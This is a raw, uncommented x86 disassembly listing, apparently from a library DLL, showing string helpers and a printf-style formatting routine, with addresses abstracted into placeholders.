mov edi [ esp + 0x10 ]
cmp eax 0x1
jbe r-xdata
test eax eax
je r-xdata
mov cl [ edi ]
test cl cl
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
mov eax ecx
add eax esi
pop esi
retn
mov [ edx ] 0x0
mov [ edx ] cl
inc edx
inc edi
inc esi
dec eax
cmp eax 0x1
ja r-xdata
sub_10026810
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
push esi
push edi
test eax eax
jbe r-xdata
mov edi [ esp + 0x14 ]
xor esi esi
cmp eax 0x1
jbe r-xdata
cmp [ ecx ] 0x0
je r-xdata
test eax eax
je r-xdata
mov dl [ edi ]
test dl dl
je r-xdata
inc ebx
dec eax
inc ecx
test eax eax
ja r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
mov eax ecx
add eax esi
pop esi
add eax ebx
pop ebx
retn
mov [ ecx ] 0x0
mov [ ecx ] dl
inc ecx
inc edi
inc esi
dec eax
cmp eax 0x1
ja r-xdata
sub_10026870
mov edx [ esp + 0x8 ]
push ebx
mov ebx [ rw-data ]
push esi
mov esi [ esp + 0xc ]
and ebx 0xff
test edx edx
mov eax esi
je r-xdata
mov eax ebx
push edx
and eax 0xff
push eax
push esi
call memchr
add esp 0xc
test eax eax
je r-xdata
push edi
lea ecx [ edx ]
mov [ rw-data ] bl
pop esi
pop ebx
retn
lea eax [ ebx + eax + 0x3f ]
pop esi
mov [ rw-data ] al
pop ebx
retn
mov [ eax ] bl
inc eax
mov edi eax
and edi 0xf
dec ecx
lea ebx [ ebx + edi + 0x11 ]
jne r-xdata
pop edi
sub_100268d0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push 0xb3
push r--data
push 0x1e
push 0x9
call sub_1001f5b0
mov eax [ esi + 0x54 ]
add esp 0x10
test eax eax
jne r-xdata
push 0xb0
push r--data
push 0x43
jmp r-xdata
push 0xbb
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
mov eax [ esi + 0x44 ]
add esp 0x10
test eax eax
jne r-xdata
push 0xb6
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
push 0xb8
push r--data
push 0x75
push 0xc0
push 0x26
call sub_1001de60
add esp 0x24
xor eax eax
pop esi
retn
push 0xc0
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ecx
push esi
call eax
add esp 0x20
pop esi
retn
push 0xbf
push r--data
push 0x7d
sub_100269b0
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esp + 0x18 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_100269f0
push esi
mov esi [ rw-data ]
push 0xa1
push r--data
push 0x14
push 0x9
call sub_1001f5b0
mov eax [ esp + 0x18 ]
add esp 0x10
cmp eax 0x3
ja r-xdata
push 0xdd
push r--data
push 0x14
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax esi
pop esi
retn
jmp [ eax * 4 + jump_table_10026b24 ]
mov [ rw-data ] 0x3
mov [ rw-data ] 0x0
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
jmp r-xdata
test [ rw-data ] 0x1
je r-xdata
test [ rw-data ] 0x1
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xbd
push r--data
push 0x14
push 0xa
call sub_1001f5b0
push 0xc3
push r--data
push 0x1b
push 0x9
call sub_1001f5b0
push 0xc4
push r--data
push 0x14
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x30
and al 0xfd
mov [ rw-data ] eax
call sub_1001f590
mov [ rw-data ] eax
call sub_1001f590
cmp [ rw-data ] eax
je r-xdata
dec eax
mov [ rw-data ] eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
mov edx [ rw-data ]
push 0xd4
push r--data
or edx 0x2
push 0x1b
push 0xa
mov [ rw-data ] edx
call sub_1001f5b0
add esp 0x10
sub_10026b40
mov eax 0x814
call sub_1001d0d0
push esi
mov esi [ esp + 0x820 ]
push 0x31a
lea eax [ esp + 0x1c ]
push r--data
push r--data
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] 0x800
mov [ esp + 0x10 ] 0x0
call sub_1001d780
lea ecx [ esp + 0x830 ]
lea edx [ esp + 0x20 ]
push ecx
push esi
lea eax [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x20 ]
push ecx
lea eax [ esp + 0x30 ]
push edx
push eax
call sub_10026c10
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
add esp 0x28
test eax eax
push ecx
je r-xdata
mov eax [ esp + 0x820 ]
lea edx [ esp + 0x1c ]
push edx
push eax
call sub_100209d0
add esp 0xc
mov esi eax
call sub_1001d7b0
mov eax esi
pop esi
add esp 0x814
retn
mov edx [ esp + 0x820 ]
push eax
push edx
call sub_100209d0
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call sub_1001d740
add esp 0x10
call sub_1001d7b0
mov eax esi
pop esi
add esp 0x814
retn
sub_10026c10
mov eax 0x50
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push esi
xor eax eax
xor esi esi
mov bl [ ebp ]
inc ebp
push edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] 0xffffffff
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
mov ecx [ esp + 0x6c ]
mov esi [ esp + 0x10 ]
mov edx [ esp + 0x74 ]
pop edi
mov eax [ ecx ]
dec eax
cmp eax esi
pop esi
sbb eax eax
pop ebp
neg eax
mov [ edx ] eax
pop ebx
je r-xdata
mov ecx [ esp + 0x68 ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x5c ]
mov eax [ esp + 0x58 ]
push 0x0
lea edx [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x5c ]
push edx
push eax
push ecx
call sub_100278e0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x74 ]
dec edx
mov [ eax ] edx
add esp 0x64
retn
mov eax [ ecx ]
dec eax
mov [ esp ] eax
cmp esi 0x6
ja r-xdata
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x10 ]
cmp ecx [ edx ]
jae r-xdata
cmp esi 0x7
jne r-xdata
jmp [ esi * 4 + jump_table_10027554 ]
test bl bl
je r-xdata
cmp bl 0x25
jne r-xdata
movsx ecx bl
add ecx 0xffffffe0
cmp ecx 0x10
ja r-xdata
mov eax [ esp + 0x18 ]
and eax 0xff
push eax
call isdigit
add esp 0x4
test eax eax
je r-xdata
cmp bl 0x2e
jne r-xdata
mov edx [ esp + 0x18 ]
and edx 0xff
push edx
call isdigit
add esp 0x4
test eax eax
je r-xdata
movsx ecx bl
lea esi [ ecx - 0x4c ]
cmp esi 0x25
ja r-xdata
movsx esi bl
lea ecx [ esi - 0x25 ]
cmp ecx 0x53
ja r-xdata
mov ecx [ esp + 0x6c ]
lea edx [ esp + 0x10 ]
movsx eax bl
push eax
mov eax [ esp + 0x6c ]
push ecx
mov ecx [ esp + 0x6c ]
push edx
push eax
push ecx
call sub_100278e0
mov eax [ esp + 0x34 ]
add esp 0x14
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
xor edx edx
mov dl [ ecx + lookup_table_10027588 ]
jmp [ edx * 4 + jump_table_10027570 ]
cmp bl 0x2a
jne r-xdata
mov eax [ esp + 0x24 ]
movsx edx bl
lea ecx [ eax + eax * 4 ]
lea eax [ edx + ecx * 2 - 0x30 ]
mov [ esp + 0x24 ] eax
jmp r-xdata
mov esi 0x5
jmp r-xdata
mov bl [ ebp ]
inc ebp
mov esi 0x4
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
jmp r-xdata
cmp bl 0x2a
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jge r-xdata
mov esi 0x6
jmp r-xdata
xor ecx ecx
mov cl [ esi + lookup_table_100275b0 ]
jmp [ ecx * 4 + jump_table_1002759c ]
mov bl [ ebp ]
inc ebp
xor eax eax
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
xor esi esi
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
xor edx edx
mov dl [ ecx + lookup_table_10027608 ]
jmp [ edx * 4 + jump_table_100275d8 ]
mov bl [ ebp ]
inc ebp
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
mov edx [ esp + 0x14 ]
or edx 0x1
jmp r-xdata
mov edx [ esp + 0x14 ]
or edx 0x2
jmp r-xdata
mov edx [ esp + 0x14 ]
or edx 0x4
jmp r-xdata
mov edx [ esp + 0x14 ]
or edx 0x8
jmp r-xdata
mov edx [ esp + 0x14 ]
or edx 0x10
mov eax [ esp + 0x20 ]
mov esi 0x3
jmp r-xdata
mov bl [ ebp ]
mov ecx [ edi ]
add edi 0x4
inc ebp
mov [ esp + 0x7c ] edi
mov [ esp + 0x24 ] ecx
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
mov bl [ ebp ]
mov eax [ esp + 0x20 ]
inc ebp
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
jmp r-xdata
mov eax [ esp + 0x20 ]
mov esi 0x5
jmp r-xdata
mov bl [ ebp ]
mov eax [ edi ]
add edi 0x4
inc ebp
mov [ esp + 0x7c ] edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea edx [ ecx + eax * 2 - 0x30 ]
mov [ esp + 0x1c ] edx
xor eax eax
mov eax 0x1
jmp r-xdata
cmp [ ebp ] 0x6c
jne r-xdata
mov eax 0x4
jmp r-xdata
mov eax 0x3
mov edi [ esp + 0x7c ]
dec eax
je r-xdata
mov ecx [ esp + 0x14 ]
or ecx 0x20
jmp r-xdata
mov ecx [ esp + 0x14 ]
fld [ edi ]
mov ebp [ esp + 0x1c ]
add edi 0x8
mov [ esp + 0x7c ] edi
xor esi esi
xor edi edi
mov [ esp + 0x28 ] ebp
test ebp ebp
mov [ esp + 0x20 ] esi
jge r-xdata
add edi 0x8
mov [ esp + 0x7c ] edi
jmp r-xdata
mov edx [ edi ]
mov eax [ esp + 0x6c ]
add edi 0x4
push edx
mov edx [ esp + 0x6c ]
lea ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x6c ]
push ecx
push edx
push eax
mov [ esp + 0x90 ] edi
call sub_100278e0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ edi ]
add edi 0x4
test eax eax
mov [ esp + 0x7c ] edi
jge r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x24 ]
or al 0x8
add edi 0x4
push eax
mov eax [ esp + 0x20 ]
push eax
mov eax [ edi - 0x4 ]
cdq
push ecx
mov ecx [ esp + 0x74 ]
push 0x10
push edx
mov edx [ esp + 0x80 ]
push eax
lea eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x80 ]
push eax
push ecx
push edx
mov [ esp + 0xa4 ] edi
call sub_10027660
add esp 0x28
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x68 ]
push esi
lea eax [ esp + 0x14 ]
push edx
mov edx [ esp + 0x6c ]
push eax
push ecx
push edx
call sub_100278e0
add esp 0x14
jmp r-xdata
inc ebp
jmp r-xdata
mov bl [ ebp ]
inc ebp
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
jmp r-xdata
mov [ esp + 0x20 ] eax
mov eax 0x2
jmp r-xdata
mov eax 0x4
inc ebp
mov [ esp + 0x20 ] eax
jmp r-xdata
movsx eax [ edi ]
add edi 0x4
mov [ esp + 0x7c ] edi
dec eax
je r-xdata
or ecx 0x40
dec eax
je r-xdata
add edi 0x4
xor eax eax
mov [ esp + 0x7c ] edi
mov ax [ edi - 0x4 ]
cdq
dec eax
je r-xdata
fcom [ r--data ]
fst [ esp + 0x30 ]
fnstsw ax
test ah 0x1
je r-xdata
mov ebp 0x6
mov [ esp + 0x28 ] ebp
xor edi edi
test ebx ebx
jne r-xdata
mov eax [ esp + 0x68 ]
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ edi ]
mov cx [ esp + 0x10 ]
add edi 0x4
mov [ esp + 0x7c ] edi
mov [ eax ] cx
jmp r-xdata
mov bl [ ebp ]
inc ebp
mov [ esp + 0x18 ] bl
mov [ esp + 0x78 ] ebp
mov eax [ edi ]
add edi 0x4
mov [ esp + 0x7c ] edi
jmp r-xdata
sub eax 0x2
je r-xdata
sub bl 0x75
neg bl
sbb ebx ebx
and ebx 0x6
add ebx 0xa
mov edi ebx
mov edi 0x8
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ esp + 0x7c ] edi
xor edx edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov al [ esp + 0x14 ]
test al 0x2
fstp st0
je r-xdata
fchs
fstp [ esp + 0x30 ]
mov [ esp + 0x20 ] 0x2d
jmp r-xdata
mov cl [ ebx ]
xor eax eax
test cl cl
je r-xdata
mov ebx r--data
mov ecx [ esp + 0x6c ]
mov edx [ ecx ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x1c ] 0x7fffffff
jmp r-xdata
cmp eax 0x4
jne r-xdata
mov edx [ edi ]
mov eax [ esp + 0x10 ]
add edi 0x4
mov [ esp + 0x7c ] edi
mov [ edx ] eax
jmp r-xdata
cdq
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
mov [ esp + 0x7c ] edi
jmp r-xdata
push ecx
mov ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x74 ]
push edi
push edx
mov edx [ esp + 0x80 ]
push eax
lea eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x80 ]
push eax
push ecx
push edx
call sub_10027660
add esp 0x28
jmp r-xdata
cmp bl 0x6f
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
mov [ esp + 0x7c ] edi
jmp r-xdata
test al 0x4
je r-xdata
mov [ esp + 0x20 ] 0x2b
jmp r-xdata
fld [ esp + 0x30 ]
call _ftol
mov ebx eax
cmp ebp 0x9
mov [ esp + 0x2c ] ebx
jle r-xdata
mov esi [ esp + 0x24 ]
sub esi eax
jns r-xdata
mov cl [ eax + ebx + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov eax [ edi ]
mov ecx [ esp + 0x10 ]
add edi 0x4
mov [ esp + 0x7c ] edi
mov [ eax ] ecx
jmp r-xdata
mov ecx [ edi + eax - 0x4 ]
mov edx [ esp + 0x10 ]
add edi eax
mov [ ecx ] edx
mov [ esp + 0x7c ] edi
mov [ ecx + 0x4 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x74 ]
push 0xa
push edx
mov edx [ esp + 0x80 ]
push eax
lea eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x80 ]
push eax
push ecx
push edx
call sub_10027660
add esp 0x28
jmp r-xdata
mov [ esp + 0x20 ] 0x20
fld [ r--data ]
test ebp ebp
je r-xdata
mov ebp 0x9
mov [ esp + 0x28 ] ebp
test [ esp + 0x14 ] 0x1
je r-xdata
xor esi esi
fld st0
call _ftol
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fsubr st1
fcomp [ r--data ]
fnstsw ax
test ah 0x1
fstp st0
jne r-xdata
mov eax ebp
test esi esi
jle r-xdata
neg esi
fld [ r--data ]
test ebp ebp
je r-xdata
inc [ esp + 0x1c ]
fmul [ r--data ]
dec eax
jne r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp edi [ esp + 0x1c ]
jge r-xdata
fild [ esp + 0x2c ]
fsubr [ esp + 0x30 ]
fmulp st1
fld st0
call _ftol
mov ecx eax
mov [ esp + 0x2c ] ecx
fild [ esp + 0x2c ]
fsubr st1
fcomp [ r--data ]
fnstsw ax
test ah 0x1
fstp st0
jne r-xdata
fmul [ r--data ]
dec ebp
jne r-xdata
test esi esi
jge r-xdata
cmp edi [ esp + 0x1c ]
jge r-xdata
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x68 ]
push 0x20
lea ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x6c ]
push ecx
push edx
push eax
call sub_100278e0
add esp 0x14
dec esi
inc edi
test esi esi
jg r-xdata
mov eax [ esp + 0x1c ]
cmp ecx eax
jl r-xdata
inc ecx
cmp edi [ esp + 0x1c ]
jge r-xdata
mov ecx [ esp + 0x6c ]
lea edx [ esp + 0x10 ]
movsx eax al
push eax
mov eax [ esp + 0x6c ]
push ecx
mov ecx [ esp + 0x6c ]
push edx
push eax
push ecx
inc ebx
call sub_100278e0
mov al [ ebx ]
add esp 0x14
inc edi
test al al
jne r-xdata
mov eax ebx
mov ebp 0xa
cdq
idiv ebp
inc edi
mov al [ edx + r--data ]
mov [ esp + edi + 0x37 ] al
mov eax 0x66666667
imul ebx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
je r-xdata
inc ebx
sub ecx eax
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x68 ]
push 0x20
lea eax [ esp + 0x14 ]
push edx
mov edx [ esp + 0x6c ]
push eax
push ecx
push edx
call sub_100278e0
add esp 0x14
inc esi
inc edi
test esi esi
jl r-xdata
cmp edi 0x14
jne r-xdata
cmp edi 0x14
jl r-xdata
jmp r-xdata
mov ebx [ esp + 0x28 ]
mov [ esp + edi + 0x38 ] 0x0
mov edi 0x13
mov eax ecx
mov ebp 0xa
cdq
idiv ebp
mov eax 0x66666667
inc esi
mov dl [ edx + r--data ]
mov [ esp + esi + 0x4b ] dl
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
cmp esi ebx
mov ecx edx
jl r-xdata
cmp esi 0x14
jne r-xdata
mov ebp [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
xor edx edx
xor ecx ecx
cmp ebp edx
mov [ esp + esi + 0x4c ] 0x0
setne cl
sub eax ecx
mov ecx ebx
sub eax edi
sub eax ebx
dec eax
sub ecx esi
mov [ esp + 0x24 ] eax
mov [ esp + 0x2c ] ecx
jns r-xdata
mov esi 0x13
cmp eax edx
jge r-xdata
mov [ esp + 0x2c ] edx
mov cl [ esp + 0x14 ]
test cl 0x1
je r-xdata
xor eax eax
mov [ esp + 0x24 ] eax
test cl 0x10
je r-xdata
neg eax
mov [ esp + 0x24 ] eax
cmp eax edx
jle r-xdata
cmp eax edx
jle r-xdata
mov ebp [ esp + 0x6c ]
mov ebx [ esp + 0x68 ]
mov ebp [ esp + 0x6c ]
mov ebx [ esp + 0x68 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] edx
cmp ebp edx
je r-xdata
test edi edi
jle r-xdata
mov edx [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push ebx
push edx
call sub_100278e0
add esp 0x14
mov edx [ esp + 0x64 ]
push 0x20
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push ebx
push edx
call sub_100278e0
mov eax [ esp + 0x30 ]
add esp 0x14
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
jmp r-xdata
mov ebp [ esp + 0x6c ]
mov ebx [ esp + 0x68 ]
mov edx [ esp + 0x20 ]
mov ebp [ esp + 0x6c ]
mov ebx [ esp + 0x68 ]
mov ecx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x14 ]
push ebp
push eax
push ebx
push ecx
call sub_100278e0
mov eax [ esp + 0x38 ]
add esp 0x14
dec eax
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x24 ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jg r-xdata
movsx eax [ esp + edi + 0x37 ]
dec edi
mov edx [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push ebx
push edx
call sub_100278e0
add esp 0x14
test edi edi
jg r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] 0x0
mov eax [ esp + 0x24 ]
test eax eax
jle r-xdata
mov edi [ esp + 0x64 ]
push 0x2e
lea eax [ esp + 0x14 ]
push ebp
push eax
push ebx
push edi
call sub_100278e0
add esp 0x14
test esi esi
jle r-xdata
test [ esp + 0x14 ] 0x8
je r-xdata
mov eax [ esp + 0x64 ]
push 0x30
lea edx [ esp + 0x14 ]
push ebp
push edx
push ebx
push eax
call sub_100278e0
mov eax [ esp + 0x30 ]
add esp 0x14
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
jmp r-xdata
mov esi [ esp + 0x2c ]
test esi esi
jle r-xdata
movsx ecx [ esp + esi + 0x4b ]
dec esi
push ecx
lea edx [ esp + 0x14 ]
push ebp
push edx
push ebx
push edi
call sub_100278e0
add esp 0x14
test esi esi
jg r-xdata
mov edi [ esp + 0x64 ]
mov esi [ esp + 0x24 ]
test esi esi
jge r-xdata
push 0x30
lea eax [ esp + 0x14 ]
push ebp
push eax
push ebx
push edi
call sub_100278e0
add esp 0x14
dec esi
jne r-xdata
jmp r-xdata
mov ebp [ esp + 0x78 ]
neg esi
push 0x20
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push ebx
push edi
call sub_100278e0
add esp 0x14
dec esi
jne r-xdata
sub_10027660
mov eax 0x28
call sub_1001d0d0
mov eax [ esp + 0x4c ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] rw-data
mov [ esp + 0x18 ] ebp
jge r-xdata
mov al [ esp + 0x60 ]
mov esi [ esp + 0x4c ]
mov edi [ esp + 0x50 ]
test al 0x40
jne r-xdata
mov [ esp + 0x5c ] ebp
test al 0x8
je r-xdata
cmp edi ebp
jg r-xdata
test al 0x20
je r-xdata
mov ecx [ esp + 0x54 ]
cmp ecx 0x8
jne r-xdata
test al 0x2
je r-xdata
jl r-xdata
mov eax [ esp + 0x18 ]
mov ebx r--data
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x1
cmp ecx 0x10
jne r-xdata
mov [ esp + 0x10 ] r--data
jmp r-xdata
test al 0x4
je r-xdata
mov [ esp + 0x14 ] 0x2b
jmp r-xdata
neg esi
adc edi ebp
mov [ esp + 0x14 ] 0x2d
neg edi
jmp r-xdata
cmp esi ebp
jae r-xdata
xor eax eax
push eax
mov eax [ esp + 0x58 ]
push eax
push edi
push esi
call sub_1006af80
mov cl [ eax + ebx ]
mov edx [ esp + 0x54 ]
xor eax eax
mov [ esp + ebp + 0x1c ] cl
push eax
push edx
push edi
push esi
inc ebp
call sub_1006af10
mov edi edx
mov esi eax
or eax edi
je r-xdata
mov ebx r--data
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] 0x20
cmp ebp 0x1a
mov [ esp + 0x4c ] ebp
jne r-xdata
cmp ebp 0x1a
jl r-xdata
mov eax [ esp + 0x5c ]
mov [ esp + ebp + 0x1c ] 0x0
mov esi eax
sub esi ebp
cmp eax ebp
mov [ esp + 0x5c ] esi
jl r-xdata
mov [ esp + 0x4c ] 0x19
mov ebp [ esp + 0x4c ]
mov edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x14 ]
[ edi ]
not ecx
xor edi edi
dec ecx
cmp edx edi
mov edx [ esp + 0x58 ]
setne al
sub edx eax
sub edx ebp
sub edx ecx
cmp esi edi
mov [ esp + 0x54 ] edx
jge r-xdata
mov ebp eax
cmp edx edi
jge r-xdata
mov [ esp + 0x5c ] edi
mov esi edi
mov al [ esp + 0x60 ]
test al 0x10
je r-xdata
mov [ esp + 0x54 ] edi
mov edx edi
test al 0x1
je r-xdata
cmp esi edx
jge r-xdata
mov esi [ esp + 0x48 ]
mov ebx [ esp + 0x40 ]
mov ebp [ esp + 0x3c ]
cmp edx edi
mov edi [ esp + 0x44 ]
jle r-xdata
neg edx
mov [ esp + 0x54 ] edx
mov [ esp + 0x54 ] edi
mov edx edi
mov [ esp + 0x5c ] edx
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov [ esp + 0x60 ] edx
mov [ esp + 0x54 ] 0x0
mov ecx [ esp + 0x10 ]
mov al [ ecx ]
test al al
je r-xdata
push eax
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov edx [ esp + 0x68 ]
add esp 0x14
push 0x20
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov eax [ esp + 0x74 ]
add esp 0x14
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x5c ]
test eax eax
jle r-xdata
movsx edx al
push edx
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov eax [ esp + 0x24 ]
add esp 0x14
inc eax
mov [ esp + 0x10 ] eax
mov al [ eax ]
test al al
jne r-xdata
mov eax [ esp + 0x4c ]
test eax eax
jle r-xdata
mov [ esp + 0x5c ] eax
mov edx [ esp + 0x54 ]
test edx edx
jge r-xdata
mov eax [ esp + 0x4c ]
dec eax
mov [ esp + 0x4c ] eax
movsx eax [ esp + eax + 0x1c ]
push eax
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov eax [ esp + 0x60 ]
add esp 0x14
test eax eax
jg r-xdata
push 0x30
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov eax [ esp + 0x70 ]
add esp 0x14
dec eax
mov [ esp + 0x5c ] eax
jne r-xdata
mov edx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
neg edx
mov [ esp + 0x54 ] edx
mov edx [ esp + 0x54 ]
push 0x20
push esi
push edi
push ebx
push ebp
call sub_100278e0
mov eax [ esp + 0x68 ]
add esp 0x14
dec eax
mov [ esp + 0x54 ] eax
jne r-xdata
sub_100278e0
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x18 ]
test ebx ebx
push esi
je r-xdata
mov esi [ esp + 0x18 ]
mov esi [ esp + 0x18 ]
mov eax [ ebp ]
cmp [ esi ] eax
jb r-xdata
pop esi
pop ebp
pop ebx
retn
mov ecx [ esp + 0x10 ]
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp ]
cmp eax ecx
jae r-xdata
push edi
mov dl [ esp + 0x20 ]
mov [ ecx + eax ] dl
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov ecx [ ebx ]
add eax 0x400
push 0x2ed
mov [ ebp ] eax
mov edx [ ebx ]
push r--data
push eax
push edx
call sub_1001d540
add esp 0x10
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
pop edi
jmp r-xdata
mov eax [ ebp ]
push 0x2e5
push r--data
push eax
call sub_1001d4c0
mov [ ebx ] eax
mov ecx [ esi ]
add esp 0xc
test ecx ecx
jbe r-xdata
mov [ ebp ] 0x400
mov ecx [ esp + 0x14 ]
mov [ ecx ] 0x0
jmp r-xdata
mov edx [ esp + 0x14 ]
mov edi eax
mov eax ecx
mov esi [ edx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x1c ]
mov eax [ ebp ]
mov ecx [ esi ]
cmp ecx eax
jae r-xdata
sub_100279b0
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x18 ]
mov [ esp + 0xc ] ecx
push edx
lea ecx [ esp + 0x4 ]
push eax
lea edx [ esp + 0xc ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
lea ecx [ esp + 0x20 ]
push 0x0
push ecx
call sub_10026c10
mov eax [ esp + 0x1c ]
add esp 0x1c
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
cmp eax 0x7fffffff
jbe r-xdata
add esp 0x8
retn
sub_10027a10
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x30 ]
push edi
xor edi edi
mov eax [ esi + 0x8 ]
mov ebp [ esi + 0x14 ]
cmp eax edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x2c ] ebp
mov [ esp + 0x34 ] edi
mov [ esp + 0x18 ] edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esp + 0x28 ] eax
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
push 0x6d
push r--data
push 0x69
push 0x7f
push 0xb
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esi + 0xc ]
